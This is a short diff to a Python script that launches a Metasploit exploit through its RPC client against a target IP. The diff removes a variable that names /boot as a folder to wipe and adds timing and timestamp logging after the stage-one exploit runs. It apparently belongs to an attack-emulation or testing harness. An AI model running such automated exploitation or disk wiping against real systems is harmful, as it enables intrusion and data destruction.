@@ -17,7 +17,6 @@ def main(argv):
     folder = argv[1]
     my_ip = argv[2]
     target_ip = argv[3]
-    wipe_disk_folder = "/boot"
 
     client = MsfRpcClient('kali')
 
@@ -34,6 +33,11 @@ def main(argv):
     #print('Start 1')
 
     exploit.execute(payload=payload)
+
+    time.sleep(10)
+    output_time_file = 'time_stage_1_end.txt'
+    record_timestamp(folder, output_time_file)
+    time.sleep(2)
 
 
 main(sys.argv)
